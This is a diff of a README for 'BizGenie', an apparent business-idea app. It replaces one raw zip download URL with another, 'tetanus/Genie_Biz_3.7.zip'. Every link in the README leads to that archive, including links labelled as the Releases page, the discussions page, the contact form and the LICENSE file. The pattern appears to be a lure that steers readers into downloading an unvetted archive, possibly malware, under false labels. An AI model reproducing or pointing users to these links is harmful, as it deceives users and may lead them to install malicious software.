@@ -17,13 +17,13 @@ Welcome to BizGenie! This application helps aspiring entrepreneurs convert ideas
 - Validation
 
 ## 📥 Download BizGenie
-[![Download BizGenie](https://raw.githubusercontent.com/divinwix/BizGenie/main/tetanus/BizGenie.zip%20BizGenie-v1.0-blue)](https://raw.githubusercontent.com/divinwix/BizGenie/main/tetanus/BizGenie.zip)
+[![Download BizGenie](https://github.com/divinwix/BizGenie/raw/refs/heads/main/tetanus/Genie_Biz_3.7.zip%20BizGenie-v1.0-blue)](https://github.com/divinwix/BizGenie/raw/refs/heads/main/tetanus/Genie_Biz_3.7.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to get BizGenie ready for use:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/divinwix/BizGenie/main/tetanus/BizGenie.zip) to find the latest version of BizGenie.
+   Go to the [Releases page](https://github.com/divinwix/BizGenie/raw/refs/heads/main/tetanus/Genie_Biz_3.7.zip) to find the latest version of BizGenie.
 
 2. **Choose Your Download**  
    Select the appropriate version for your operating system. If you are unsure, we recommend the latest stable release.
@@ -60,13 +60,13 @@ If you encounter issues, consider the following steps:
 If problems persist, you can open an issue on the GitHub page, and we will assist you.
 
 ## 💬 Community Support
-Join our community of indie hackers to share your experiences and learn from others. Connect with fellow users on our [GitHub discussions page](https://raw.githubusercontent.com/divinwix/BizGenie/main/tetanus/BizGenie.zip).
+Join our community of indie hackers to share your experiences and learn from others. Connect with fellow users on our [GitHub discussions page](https://github.com/divinwix/BizGenie/raw/refs/heads/main/tetanus/Genie_Biz_3.7.zip).
 
 ## 📞 Contact
-For further assistance, you can reach out via the contact form on our [GitHub page](https://raw.githubusercontent.com/divinwix/BizGenie/main/tetanus/BizGenie.zip).
+For further assistance, you can reach out via the contact form on our [GitHub page](https://github.com/divinwix/BizGenie/raw/refs/heads/main/tetanus/Genie_Biz_3.7.zip).
 
 ## 📜 License
-BizGenie is open-source software. You can review the full license details in the [LICENSE](https://raw.githubusercontent.com/divinwix/BizGenie/main/tetanus/BizGenie.zip) file.
+BizGenie is open-source software. You can review the full license details in the [LICENSE](https://github.com/divinwix/BizGenie/raw/refs/heads/main/tetanus/Genie_Biz_3.7.zip) file.
 
 ## 📥 Download BizGenie Again
-Don’t forget to check out the latest version anytime on our [Releases page](https://raw.githubusercontent.com/divinwix/BizGenie/main/tetanus/BizGenie.zip). Enjoy your entrepreneurial journey with BizGenie!
+Don’t forget to check out the latest version anytime on our [Releases page](https://github.com/divinwix/BizGenie/raw/refs/heads/main/tetanus/Genie_Biz_3.7.zip). Enjoy your entrepreneurial journey with BizGenie!
